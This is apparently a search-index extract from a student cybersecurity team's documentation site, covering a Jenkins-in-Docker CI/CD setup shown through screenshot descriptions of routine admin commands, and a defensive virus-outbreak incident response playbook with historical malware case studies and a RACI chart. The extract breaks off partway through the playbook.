https://learn.microsoft.com/en-us/sysinternals/downloads/sysmonKarelumair. (2023). custom-misp.py for Wazuh-MISP Integration. https://github.com/karelumair/MISP-Wazuh-IntegrationFluent Bit. (2024). Fluent Bit Log Processor. https://docs.fluentbit.io/Graylog. (2024). Graylog 5.1/5.2 Documentation. https://docs.graylog.org  ","version":"Next","tagName":"h2"},{"title":"Video Tutorials​","type":1,"pageTitle":"Report on Integrating MISP with Wazuh and Graylog","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh - MISP Integration/#video-tutorials","content":"      ","version":"Next","tagName":"h2"},{"title":"Proof of Implementation: CI/CD","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/CI-CD-Implementation/Implementation Proof","content":"","keywords":"","version":"Next"},{"title":"Jenkins Docker Container Running in Docker Desktop with Resource Usage Overview​","type":1,"pageTitle":"Proof of Implementation: CI/CD","url":"/redback-documentation/docs/cybersecurity/GRC Team/CI-CD-Implementation/Implementation Proof#jenkins-docker-container-running-in-docker-desktop-with-resource-usage-overview","content":"   This screenshot showcases Docker Desktop with a Jenkins container actively running. The container's status is marked as &quot;Running,&quot; indicating that Jenkins is currently operational. The image reflects that the Jenkins container is based on the jenkins/jenkins:lts image, which is a long-term support version. The ports mapped include 3000:3000 and others that ensure Jenkins is accessible via the browser for configuration and interaction.  The resource usage is minimal, with CPU usage at 0.16% and memory usage at 1.01GB out of 7.42GB available on the system. This indicates that the container is running efficiently on the host machine with Docker’s management.  This screenshot is significant as it demonstrates the successful setup of Jenkins in a Docker container environment. Docker's ability to isolate Jenkins in its own containerized environment ensures scalability, consistency, and ease of maintenance, which are crucial in continuous integration (CI) and continuous deployment (CD) pipelines.    ","version":"Next","tagName":"h2"},{"title":"Accessing Ubuntu 20.04 Linux VM via SSH with Docker Version Verification​","type":1,"pageTitle":"Proof of Implementation: CI/CD","url":"/redback-documentation/docs/cybersecurity/GRC Team/CI-CD-Implementation/Implementation Proof#accessing-ubuntu-2004-linux-vm-via-ssh-with-docker-version-verification","content":"   This screenshot displays a terminal session where the user is logged into an Ubuntu 20.04 Linux virtual machine (VM) via SSH. The login prompt confirms the session with the user credentials and hostname (dhairya@redback.it.deakin.edu.au). System information, such as CPU usage (0.32), memory usage (31%), and load average, is shown, which helps monitor the VM’s current resource utilization.  The system also indicates that a new Ubuntu version, 22.04.3 LTS, is available for an upgrade, but the current version (20.04.6 LTS) is in use. The user has also executed the command docker --version, which confirms Docker is installed and running version 20.16.2, build d11e74b.    ","version":"Next","tagName":"h2"},{"title":"Troubleshooting Docker Port Binding Conflicts and Container Naming Issues​","type":1,"pageTitle":"Proof of Implementation: CI/CD","url":"/redback-documentation/docs/cybersecurity/GRC Team/CI-CD-Implementation/Implementation Proof#troubleshooting-docker-port-binding-conflicts-and-container-naming-issues","content":"   This screenshot captures a sequence of terminal commands and outputs that reflect common Docker-related errors and their resolution process. Initially, the user attempts to run a Docker container named &quot;my_jenkins&quot; and another as &quot;jenkins,&quot; both intended to host Jenkins installations. However, conflicts arise due to port binding issues and duplicate container names, as indicated by error messages stating that ports are already in use and containers with those names already exist.  Commands like docker stop jenkins and docker rm jenkins are executed to remove the existing container, aiming to resolve the name conflicts. Furthermore, the user verifies the Docker version and inspects network settings using ifconfig, ensuring no underlying network issues are contributing to the Docker errors.    ","version":"Next","tagName":"h2"},{"title":"Addressing Docker Engine and Container Naming Issues with Volume Inspection​","type":1,"pageTitle":"Proof of Implementation: CI/CD","url":"/redback-documentation/docs/cybersecurity/GRC Team/CI-CD-Implementation/Implementation Proof#addressing-docker-engine-and-container-naming-issues-with-volume-inspection","content":"   This screenshot captures a terminal session where the user attempts to run a Jenkins container using Docker commands but encounters multiple errors related to Docker Engine connectivity and container name conflicts. Initially, the user faces a connection issue with the Docker Desktop Linux Engine, resulting in an error message stating, &quot;The system cannot find the file specified.&quot;  Subsequent attempts to start the Jenkins container also lead to an &quot;Internal Server Error for API route,&quot; signaling a potential issue with the Docker API. After resolving the engine connectivity issue, the user inspects the Jenkins volume (jenkins_home) to ensure that the persistent data storage is correctly set up. The volume inspection reveals details such as the volume’s creation time, driver, and mount point (/var/lib/docker/volumes/jenkins_home/_data).    ","version":"Next","tagName":"h2"},{"title":"Copying Jenkins Data from Docker Volume to Host System and Resolving Privilege Issues​","type":1,"pageTitle":"Proof of Implementation: CI/CD","url":"/redback-documentation/docs/cybersecurity/GRC Team/CI-CD-Implementation/Implementation Proof#copying-jenkins-data-from-docker-volume-to-host-system-and-resolving-privilege-issues","content":"   This screenshot shows a terminal session where the user inspects and copies Jenkins data from the Docker volume to the host system. Initially, the docker volume inspect jenkins_home command reveals details about the Jenkins volume, including its mount point (/var/lib/docker/volumes/jenkins_home/_data). The user uses docker cp to transfer Jenkins configuration files to a directory on the host machine (D:/jenkins_home), successfully transferring 363 MB of data.  However, a subsequent attempt to use scp (secure copy) encounters a permission error: &quot;A required privilege is not held by the client.&quot; This error suggests that the current user lacks administrative rights to complete the transfer, likely due to Windows’ file security restrictions.    ","version":"Next","tagName":"h2"},{"title":"Successful File Transfer via SCP after Resolving Permission Denial in PowerShell​","type":1,"pageTitle":"Proof of Implementation: CI/CD","url":"/redback-documentation/docs/cybersecurity/GRC Team/CI-CD-Implementation/Implementation Proof#successful-file-transfer-via-scp-after-resolving-permission-denial-in-powershell","content":"   This screenshot shows a PowerShell session where the user successfully transfers files using scp after resolving the permission error. The files are copied from D:/jenkins_home to the remote server (/home/dhairya/jenkins_folder). The successful transfer of files, including .cache, .properties, and configuration files, is confirmed with specific file sizes and transfer speeds.    ","version":"Next","tagName":"h2"},{"title":"Volume Copied​","type":1,"pageTitle":"Proof of Implementation: CI/CD","url":"/redback-documentation/docs/cybersecurity/GRC Team/CI-CD-Implementation/Implementation Proof#volume-copied","content":"     ","version":"Next","tagName":"h2"},{"title":"Resolving Docker Container Name and Port Binding Issues for Jenkins Setup​","type":1,"pageTitle":"Proof of Implementation: CI/CD","url":"/redback-documentation/docs/cybersecurity/GRC Team/CI-CD-Implementation/Implementation Proof#resolving-docker-container-name-and-port-binding-issues-for-jenkins-setup","content":"   In this screenshot, the user resolves Docker container conflicts by stopping and removing the conflicting Jenkins container using docker stop jenkins and docker rm jenkins. A port binding conflict is also resolved by ensuring port 8080 is available for the Jenkins container.    ","version":"Next","tagName":"h2"},{"title":"Verifying Running Jenkins Docker Container with Network Port Check on Ubuntu VM​","type":1,"pageTitle":"Proof of Implementation: CI/CD","url":"/redback-documentation/docs/cybersecurity/GRC Team/CI-CD-Implementation/Implementation Proof#verifying-running-jenkins-docker-container-with-network-port-check-on-ubuntu-vm","content":"   This screenshot shows the user verifying the Jenkins container status on an Ubuntu VM. The command netstat -tuln | grep 8080 confirms that port 8080 is actively in use, suggesting Jenkins is running. The docker ps command shows a Jenkins container running for 6 minutes, with port 8080/tcp exposed.    ","version":"Next","tagName":"h2"},{"title":"Verifying Port 8080 Availability and Establishing SSH Tunnel for Jenkins Access​","type":1,"pageTitle":"Proof of Implementation: CI/CD","url":"/redback-documentation/docs/cybersecurity/GRC Team/CI-CD-Implementation/Implementation Proof#verifying-port-8080-availability-and-establishing-ssh-tunnel-for-jenkins-access","content":"   The user checks the availability of port 8080 with netstat -tuln | grep 8080 and establishes an SSH tunnel using the command ssh -L 8070:localhost:8080 dhairya@redback.it.deakin.edu.au. This tunnel forwards local port 8070 to the remote server’s port 8080, allowing secure access to Jenkins.    ","version":"Next","tagName":"h2"},{"title":"System Information Overview and Network Configuration on Ubuntu VM​","type":1,"pageTitle":"Proof of Implementation: CI/CD","url":"/redback-documentation/docs/cybersecurity/GRC Team/CI-CD-Implementation/Implementation Proof#system-information-overview-and-network-configuration-on-ubuntu-vm","content":"   This screenshot provides an overview of the system status on an Ubuntu VM, including CPU load (0.02), memory usage (34%), and disk usage (16.4%). The system prompts for available updates, including security updates and a new version upgrade to 22.04.5 LTS.    Setting Up Jenkins:  ","version":"Next","tagName":"h2"},{"title":"Unlocking Jenkins​","type":1,"pageTitle":"Proof of Implementation: CI/CD","url":"/redback-documentation/docs/cybersecurity/GRC Team/CI-CD-Implementation/Implementation Proof#unlocking-jenkins","content":"     ","version":"Next","tagName":"h2"},{"title":"Retrieving Jenkins Initial Admin Password from Docker Container on Ubuntu VM​","type":1,"pageTitle":"Proof of Implementation: CI/CD","url":"/redback-documentation/docs/cybersecurity/GRC Team/CI-CD-Implementation/Implementation Proof#retrieving-jenkins-initial-admin-password-from-docker-container-on-ubuntu-vm","content":"   In this screenshot, the user retrieves the Jenkins initial admin password using sudo docker exec jenkins cat /var/jenkins_home/secrets/initialAdminPassword.    ","version":"Next","tagName":"h2"},{"title":"Installation of Jenkins​","type":1,"pageTitle":"Proof of Implementation: CI/CD","url":"/redback-documentation/docs/cybersecurity/GRC Team/CI-CD-Implementation/Implementation Proof#installation-of-jenkins","content":"     ","version":"Next","tagName":"h2"},{"title":"Jenkins Ready to Use​","type":1,"pageTitle":"Proof of Implementation: CI/CD","url":"/redback-documentation/docs/cybersecurity/GRC Team/CI-CD-Implementation/Implementation Proof#jenkins-ready-to-use","content":"     ","version":"Next","tagName":"h2"},{"title":"Ready to Build and Run​","type":1,"pageTitle":"Proof of Implementation: CI/CD","url":"/redback-documentation/docs/cybersecurity/GRC Team/CI-CD-Implementation/Implementation Proof#ready-to-build-and-run","content":"  ","version":"Next","tagName":"h2"},{"title":"Virus Outbreak Incident Response Playbook","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook","content":"","keywords":"","version":"Next"},{"title":"1. Introduction​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#1-introduction","content":" Virus outbreaks pose significant threats to data integrity, operational continuity, and organizational reputation. Timely detection, containment, and mitigation of virus incidents are crucial to minimizing damage and ensuring business resilience. This playbook provides a structured approach for managing virus outbreaks, detailing roles, responsibilities, and processes for an effective response.  ","version":"Next","tagName":"h2"},{"title":"1.1 Overview​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#11overview","content":" There is a methodical structure available in the Virus Outbreak Incident Response Playbook for identifying, stopping, eliminating, and recovering from virus attacks. It seeks to expedite reaction efforts and lessen the impact of viral outbreaks on organisational assets and stakeholders by developing defined standards and communication channels.  ","version":"Next","tagName":"h3"},{"title":"1.2 Purpose​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#12-purpose","content":" This playbook's goals are to:  For viral outbreaks, create a standard operating protocol to guarantee uniformity and efficiency in incident response.Encourage the prompt discovery and containment of occurrences to limit damage and stop future spread.Minimise financial losses and the effect of viral outbreaks on organisational operations.During incident response efforts, encourage collaboration, coordination, and communication amongst response teams, stakeholders, and other pertinent parties.  ","version":"Next","tagName":"h3"},{"title":"1.3 Attack Definition​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#13-attack-definition","content":" Malicious software that aims to damage, interfere with, or get unauthorised access to computer systems, networks, and data is known as a virus. They cover a wide range of dangers, such as spyware, ransomware, trojans, and worms. Numerous routes, including malicious websites, email attachments, infected files, and software flaws, can allow viruses to infiltrate a system.  ","version":"Next","tagName":"h3"},{"title":"1.4 Scope​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#14scope","content":" This playbook describes events pertaining to virus outbreaks that affect the computers, networks, and endpoints of Redback Operations. It deals with internal and external viral problems that impact data assets, stakeholders, and organisational procedures. Regardless of the type of virus or how it spreads, a coordinated reaction is necessary.  ","version":"Next","tagName":"h3"},{"title":"2. Attack Types​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#2-attack-types","content":" There are several ways that virus outbreaks might appear, and each one poses different difficulties for incident response teams. The subsequent assault types are frequently linked to viral outbreaks:  ","version":"Next","tagName":"h2"},{"title":"2.1 File Infector Viruses​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#21-file-infector-viruses","content":" When executable files are opened, file infector viruses cling to them, multiply, and spread to other files, causing extensive harm.  Signs of File Infector Virus Activity:  Unknown corruption or alteration of executable files. Unexpected variations in checksums or file sizes. Reports of malicious file alarms from antivirus software. Unexpected rise in system resource consumption brought on by viral propagation. Suspicious network traffic coming from machines that have been compromised. Case Study: CIH Virus (1998) Overview: The destructive file infector virus known as the CIH virus, or Chernobyl, was specifically designed to attack executable files on Windows 95 and 98.Signs of Activity: Corruption of executable files, system crashes, and data loss.Impact: Infected thousands of computers worldwide, causing widespread data loss and hardware damage.Response: Antivirus updates and system restores were implemented to recover affected systems.  ","version":"Next","tagName":"h3"},{"title":"2.2 Macro Viruses​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#22-macro-viruses","content":" Macro viruses propagate by infecting spreadsheets and documents that include macros. The macros are subsequently performed when the file is accessed, potentially leading to data loss or system interruption.  Signs of Macro Viruses Activity:  Unusual actions or error messages while attempting to open spreadsheets or documents. Emails with links to malicious documents or attachments that seem suspicious. Reports of unforeseen modifications to the layout or substance of documents. Infected papers are found and quarantined by antivirus software. Increased network traffic because of the transmission or sharing of infected documents. Case Study: Melissa Virus (1999) Overview: The Melissa virus spread through infected Word documents sent via email.Signs of Activity: Mass emailing of infected documents, unauthorized access to email contacts.Impact: Disrupted email services and caused significant financial damage estimated at $80 million.Response: Vendors of antivirus software promptly produced updates to identify and eradicate the malware. Security protocols for emails were strengthened to prevent such assaults.  ","version":"Next","tagName":"h3"},{"title":"2.3 Boot Sector Viruses​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#23-boot-sector-viruses","content":" The master boot record (MBR) or boot sector of storage devices can get infected with boot sector viruses, which impair the system's ability to start correctly and may result in data loss or system failure.  Signs of Boot Sector Viruses Activity:  Anomalous errors during the boot process or the system's inability to boot up. Reports of system files being damaged or missing. Notifications from antivirus software that boot sector viruses are present. Adjustments to disc partitions or partition tables that are not explained. Suspicious behaviour on the network coming from devices that are infected and trying to propagate the infection. Case Study: Michelangelo Virus (1992) Overview: On March 6th, a boot sector malware known as the Michelangelo virus became active and began damaging hard drives.Signs of Activity: System crashes and inability to boot.Impact: Infected thousands of computers, causing significant data loss.Response: Before March 6th, users were encouraged to do antivirus scans to identify and eliminate the infection. Protection measures for the boot area were put in place.  ","version":"Next","tagName":"h3"},{"title":"2.4 Polymorphic Viruses​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#24-polymorphic-viruses","content":" With every infection, polymorphic viruses alter their look and coding structure, making antivirus software's job of detecting and eliminating them more difficult.  Signs of Polymorphic Viruses Activity:  Files with often changing signatures are identified by antivirus software and placed in quarantine. Random crashes or problems on compromised devices that are not explained. Reports of unusual or unpredictable behaviour from files or apps. A rise in network traffic as the virus looks to infect other machines. System logs demonstrating many attempts to run malicious code with different characteristics. Case Study: Storm Worm (2007) Overview: A polymorphic malware called Storm Worm propagated via hacked websites and email attachments.Signs of Activity: Rapidly changing code signatures, system slowdowns, and crashes.Impact: Infected millions of computers worldwide, creating a large botnet.Response: To detect and neutralise the virus, security researchers used sophisticated detection techniques. Campaigns for public awareness were started to inform people about secure email usage.  ","version":"Next","tagName":"h3"},{"title":"2.5 Resident Viruses​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#25-resident-viruses","content":" Because resident viruses lodge themselves in system memory, they can continue to function even after the system is restarted.  Signs of Resident Virus Activity:  Unexpected system lag or deterioration in performance. Antivirus software that looks for infections in RAM. Persistence in task management or process monitor of processes linked to viruses. Case Study: CodeRed Worm (2001) Overview: CodeRed was a resident virus that took use of an IIS buffer overflow vulnerability to attack Windows servers.Signs of Activity: Website defacements, system slowdowns, and memory consumption.Impact: Infected over 359,000 hosts, causing estimated damages of $2.6 billion.Response: Microsoft fixed the problem via updates. It was recommended that network administrators deploy fixes and keep an eye out for unusual activities.  ","version":"Next","tagName":"h3"},{"title":"2.6 Multipartite Viruses​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#26-multipartite-viruses","content":" Multipartite viruses combine the traits of boot sector and file infector viruses to infect executable files as well as boot sectors, hence increasing their effect and spread.  Signs of Multipartite Viruses Activity:  Several antivirus notifications pointing to viruses in the boot sector and files. System instability or crashes that happen when apps are running, or the system is booting up. Reports pertaining to damaged or lost data in the impacted files and storage devices. Adjustments to system setups or settings that are not explained. Network behaviour suggestive of the spread of viruses via network drives or shared data. Case Study: Tequila Virus (1991) Overview: Tequila was a multipartite virus that attacked DOS computers' executable files as well as boot sectors.Signs of Activity: Corrupted files, system crashes, and boot failures.Impact: Infected numerous systems, causing data loss and operational disruptions.Response: Updates for antivirus software were made available to help find and eradicate the malware. It was recommended that users not share contaminated discs and do routine virus scans.  ","version":"Next","tagName":"h3"},{"title":"2.7 Network Viruses​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#27-network-viruses","content":" By exploiting holes in network protocols or services, network viruses propagate via network connections.  Signs of Network Viruses Activity:  Abnormal trends in network traffic or sudden increases in network utilisation. Warnings from antivirus software that viruses are proliferating over network sharing. Identification of questionable behaviour on servers or network equipment. Case Study: SQL Slammer (2003) Overview: A network virus known as SQL Slammer took advantage of a weakness in Microsoft SQL Server.Signs of Activity: Rapid network traffic spikes, causing widespread internet slowdowns.Impact: Infected over 75,000 systems within 10 minutes, causing network outages and significant financial damage.Response: Microsoft fixed the vulnerability with a patch. Patching and keeping an eye on network traffic were recommended for network administrators.  ","version":"Next","tagName":"h3"},{"title":"2.8 Stealth Viruses​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#28-stealth-viruses","content":" To avoid being discovered by antivirus software, stealth viruses hide their existence and carry out their operations. They frequently use sophisticated strategies to stay undetected.  Signs of Stealth Viruses Activity:  Abnormal trends in network traffic or sudden increases in network utilisation. Suspicious behaviour or symptoms, yet antivirus scans show no viruses. Unusual modifications to file properties or timestamps that suggest manipulation. Anomalies that point to possible illegal access or manipulation in system logs or event data. Unusual activity on the network coming from devices that are compromised. Reports of anomalous activity or decreased system performance on infected systems. Case Study: Stuxnet (2010) Overview: Stuxnet was a sophisticated stealth virus designed to target industrial control systems.Signs of Activity: Unexplained system behavior, manipulation of industrial processes.Impact: Damaged Iran's nuclear centrifuges, causing significant disruption.Response: To comprehend the behaviour of the infection, forensic examination was carried out in detail. To safeguard vital infrastructure, security protocols have been strengthened.  ","version":"Next","tagName":"h3"},{"title":"3. Stakeholders​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#3-stakeholders","content":" Collaboration between many Redback Operations stakeholders and external parties is necessary for an effective response to a viral epidemic.  ","version":"Next","tagName":"h2"},{"title":"3.1 IT Security Team​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#31-it-security-team","content":" Lead: Daniel McAulay (Senior Project Leader)  The IT security team oversees defending the company's digital assets against virus attacks, spotting security issues, and putting preventative and remedial measures in place. Among their responsibilities and roles are:  Evaluating the impact and reach of viral outbreaks through the analysis of security event data.Putting security measures in place to stop more illegal access and stop the spread of infections.Working together with the incident response team to control and reduce the effects of viral outbreaks.Carrying out forensic investigations to find the underlying cause of viral occurrences and stop them from happening again.Suggesting security improvements and offering incident response procedure advice to high management and other stakeholders.  ","version":"Next","tagName":"h3"},{"title":"3.2 Incident Response Team​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#32-incident-response-team","content":" Lead: Devika Sivakumar (Blue Team Leader)  The incident response team oversees managing the organization's response to viral outbreaks and organising cleaning activities. Among their responsibilities and roles are:  Determining the extent and intensity of viral epidemics and carrying out the required corrective actions.Assembling staff and resources to lessen and mitigate the effects of viral assaults.Carrying out forensic investigations to ascertain the origin and scope of viral outbreaks and collect data for prospective legal actions.Notifying top management, outside contractors, and clients on crisis response strategies and recovery initiatives.Documenting best practices and lessons gained from viral occurrences will improve the organization's ability to respond to issues.  ","version":"Next","tagName":"h3"},{"title":"3.3 Communication Team​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#33-communication-team","content":" Lead: Kaleb Bowen (Company Lead)  Regarding viral outbreaks, the communication team oversees making sure that all internal and external stakeholders are informed in a clear and consistent manner. Among their responsibilities and roles are:  Creating and carrying out communication strategies to alert relevant parties—such as staff members, clients, and outside suppliers—about viral outbreaks.Creating and distributing communication materials to answer queries and Concerns from stakeholders, including as statements, news releases, and FAQs.Taking part in public relations and media relations campaigns to safeguard the organization's image and lessen the damaging effects of viral outbreaks.Delivering frequent reports on stakeholder engagement and communication activities to the senior leadership and incident response team.  Collaboration Matrix:  IT Security Team: Response implementation and technical analysis.Incident Response Team: Coordination and execution of response actions.Communication Team: Information dissemination and media management.Senior Management: Decision-making and oversight.Legal and Compliance: Regulatory adherence and legal guidance.  ","version":"Next","tagName":"h3"},{"title":"3.4 Customers​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#34-customers","content":" Clients are people or organisations who depend on the company's goods or services and might be impacted by viral pandemics. Among their responsibilities and roles are:  Notifying the company of any unauthorised or questionable conduct pertaining to their accounts or transactions.Supplying pertinent data or proof to support the incident response team's viral outbreak investigation.Following the advice and directives of the organisation to safeguard personal data and lessen the effects of virus outbreaks.  ","version":"Next","tagName":"h3"},{"title":"3.5 Third-Party Vendors​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#35-third-party-vendors","content":" Third-party vendors are outside companies that supply the company with products, services, or assistance; they may also have access to its networks, data, and systems. Among their responsibilities and roles are:  Working along with the company's incident response team to find and fix security flaws or breaches pertaining to their goods or services.Giving the company help and support while it investigates and fixes any viruses that are damaging its networks or systems.Observing the duties imposed by law and contracts on data security and privacy, including the reporting of security breaches and assistance with incident response.  Communication Plan Template:  Internal: Immediate notification to IT Security and Incident Response Teams.External: Timely updates to customers and third-party vendors.Media: Press releases and statements to manage public relations.  ","version":"Next","tagName":"h3"},{"title":"RACI Chart for Virus Outbreak Incident Response​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#raci-chart-for-virus-outbreak-incident-response","content":" Task/Activity\tIT Security Team\tIncident Response Team\tCommunication Team\tSenior Management\tLegal and Compliance\tCustomers\tThird-Party VendorsPreparation Establish incident response team\tR, C\tA, R\tI\tI\tC\tI\tI Develop response procedures\tA, R\tR, C\tI\tC\tC\tI\tI Conduct training sessions\tA, R\tR\tI\tI\tI\tI\tI Implement surveillance systems\tA, R\tR\tI\tI\tI\tI\tI Detection Monitor system logs and traffic\tA, R\tR\tI\tI\tI\tI\tI Use IDS and SIEM tools\tA, R\tR\tI\tI\tI\tI\tI Analyse alerts\tA, R\tR\tI\tI\tI\tI\tI Analysis Collect forensic data\tA, R\tR\tI\tI\tI\tI\tI Identify attack methods\tA, R\tR\tI\tI\tI\tI\tI Determine impact\tA, R\tR\tI\tI\tI\tI\tI Containment Isolate compromised systems\tA, R\tR\tI\tI\tI\tI\tI Implement access restrictions\tA, R\tR\tI\tI\tI\tI\tI Block malicious traffic\tA, R\tR\tI\tI\tI\tI\tI Eradication Remove malicious software\tA, R\tR\tI\tI\tI\tI\tI Patch vulnerabilities\tA, R\tR\tI\tI\tI\tI\tI Update security policies\tA, R\tR\tI\tI\tI\tI\tI Recovery Restore backups\tA, R\tR\tI\tI\tI\tI\tI Rebuild systems\tA, R\tR\tI\tI\tI\tI\tI Conduct user training\tA, R\tR\tI\tI\tI\tI\tI Post-Incident Review Review incident response\tA, R\tR\tI\tI\tI\tI\tI Document lessons learned\tA, R\tR\tI\tI\tI\tI\tI Update response procedures\tA, R\tR\tI\tI\tI\tI\tI Communication Create communication plans\tC\tC\tA, R\tI\tC\tI\tI Draft communication materials\tC\tC\tA, R\tI\tC\tI\tI Manage media relations\tC\tC\tA, R\tI\tC\tI\tI Provide updates\tC\tC\tA, R\tI\tC\tI\tI  Key:  R: Responsible (those who do the work)A: Accountable (those who are ultimately answerable)C: Consulted (those who provide input)I: Informed (those who are kept up to date)  ","version":"Next","tagName":"h3"},{"title":"4. Flow Diagram​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#4-flow-diagram","content":"   Preparation (Prep): Yellow  Notify Incident Response Team: This phase is the first of getting ready to deal with a viral epidemic. As soon as a viral epidemic is detected, the incident response team is informed. We use the colour yellow to represent this stage of preparation.  Identification (Identify): Red  Contain the Outbreak; Isolate Affected Systems: This phase entails locating the viral outbreak and containing it right away. Measures are implemented to segregate compromised systems and restrict the virus's dissemination. Red is used to represent the vital and urgent nature of this stage.  Notification (Notif): Violet  Review and update antivirus definitions; perform full system scans: Notifying pertinent parties and putting initial mitigation measures in place are the main goals of this stage. Various measures are implemented to lessen the influence of the outbreak, including altering login passwords, and doing malware assessments. Malicious activity is also examined, and stakeholders are informed so they may organise a response. This notice and early reaction step are represented by the colour violet.  Containment (Contain): Sky Blue  Error-unable to isolate; Escalate to senior management: At this point, attempts are being done to stop the outbreak's spread. Senior management is informed so that the affected systems may be resolved if they cannot be effectively isolated. The containment measures meant to stop the virus's spread are symbolised by the colour sky blue.  Eradication (Erad): Light Green  Eradicate Virus; patch vulnerabilities used inn outbreak: The objectives of this step are to eradicate the infection and record incident information. Procedures for removing malware are followed, and incident details are recorded for later use. Light green is used to represent the process of getting rid of the infection and making sure the organization's systems are safe.  Recovery (Recover): Brown  Monitor for Further Activity; Initiate Recovery Procedures: At this point, attempts are being undertaken to recover from the viral outbreak and get everything back to normal. Recovery processes are started, and continual surveillance is done to find any new virus activity. The recovery phase, which aims to resume regular operations, is symbolised by the colour brown.  Post-Incident Actions (Post): Light pink  Continue Monitoring for Threats; Conduct Periodic system scans: In the last phase, post-event activities are carried out to assess the effectiveness of the reaction and pinpoint areas that require improvement. A post-event evaluation is carried out to evaluate the organization's reaction to the viral epidemic, and ongoing threat monitoring is maintained. The post-event steps intended to improve future response efforts and learn from the occurrence are indicated by the colour light pink.  ","version":"Next","tagName":"h2"},{"title":"5. Incident Response Stages​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#5-incident-response-stages","content":" ","version":"Next","tagName":"h2"},{"title":"5.1 Preparation​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#51-preparation","content":" Objective: Putting in place the tools, processes, and regulations required to control virus outbreaks. Activities: Putting up a team dedicated to incident response with specific duties.Creating strategies and processes for crisis response, such as escalation routes and communication guidelines.Ensuring preparedness via consistent training and event response practice.Putting security measures and surveillance systems in place to identify and contain viral outbreaks. Outcome: A well-prepared company that can react to virus outbreaks fast and efficiently.  ","version":"Next","tagName":"h3"},{"title":"5.2 Detection​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#52-detection","content":" Objective: The goal of the detection stage is to look for indications of malware outbreaks or illegal access to the networks and systems of the company. Activities: Keeping an eye out for questionable behaviour, such strange access patterns, or unauthorised file transfers.Using security information and event management (SIEM) and intrusion detection systems (IDS) to find and stop threats.Separating malicious from genuine activities by analysing anomalies and alarms. Outcome: Rapid reaction and mitigating actions are made possible by early virus outbreak identification.  ","version":"Next","tagName":"h3"},{"title":"5.3 Analysis​","type":1,"pageTitle":"Virus Outbreak Incident Response Playbook","url":"/redback-documentation/docs/cybersecurity/Blue Team/Playbook/Virus Outbreak Incident Response Playbook#53-analysis","content":" Objective: Recognising the characteristics and extent of the virus an outbreak. Activities: Gathering information and carrying out forensic investigation to determine the origin and severity of the virus infestation.Examining networks and systems that have been infiltrated to identify attack strategies and the impact on compromised data.Recognising the tactics, methods, and procedures (TTPs) of threat actors and indicators of compromise (IOCs). Outcome: A thorough comprehension of the virus outbreak, considering its 